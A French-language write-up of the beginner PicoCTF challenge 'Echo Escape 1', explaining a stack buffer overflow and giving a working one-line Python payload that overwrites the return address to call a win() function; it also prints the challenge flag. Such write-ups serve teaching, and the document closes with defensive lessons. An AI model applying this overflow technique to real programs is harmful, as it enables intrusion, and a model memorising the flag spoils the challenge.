# Writeup PicoCTF - Echo Escape 1

**Challenge :** Echo Escape 1
**Catégorie :** Binary Exploitation
**Points :** 100 pts
**Flag :** `picoCTF{3ch0_s3rv1c3_br34k5_5f4859dd}`

## Description

Le service "secure echo" présente une vulnérabilité de dépassement de tampon (buffer overflow) classique. L'objectif est de détourner le flux d'exécution pour appeler une fonction `win()` qui affiche le flag.

## Analyse du code source (`vuln.c`)

Le programme utilise un tampon de 32 octets et lit 128 octets :

```c
char buf[32]; 
read(0, buf, 128); // Vulnérabilité ici
```

Il existe une fonction `win()` qui lit et affiche le contenu de `flag.txt` :

```c
void win() { ... }
```

## Étapes de l'exploitation

### 1. Recherche de l'adresse de `win`

À l'aide de `objdump`, on récupère l'adresse de la fonction `win` :

```bash
objdump -t vuln | grep win
# 0000000000401256 g     F .text  00000000000000a5              win
```

### 2. Calcul de l'offset

Le tampon `buf` commence à `rbp - 0x20` (32 octets). Le pointeur d'instruction sauvegardé (RIP) se trouve à `rbp + 0x08`.
L'offset total est donc : `32 + 8 = 40 octets`.

### 3. Forger le payload

Le payload doit être composé de :

- 40 octets de remplissage (ex: 'A')
- L'adresse de `win` en petit-boutiste (little-endian) : `\x56\x12\x40\x00\x00\x00\x00\x00`

### 4. Injection

En local :

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\x56\x12\x40\x00\x00\x00\x00\x00")' | ./vuln
```

## Concepts clés retenus

- **Buffer Overflow** : Ne jamais faire confiance à la taille des entrées utilisateur. Utiliser des fonctions comme `fgets` ou vérifier la taille passée à `read`.

- **Contrôle du RIP** : Comprendre l'organisation de la pile (stack layout) est crucial pour rediriger l'exécution d'un programme.
- **Fonction win** : Dans de nombreux défis CTF de type pwn débutant, une fonction "cachée" peut être appelée directement via un débordement.
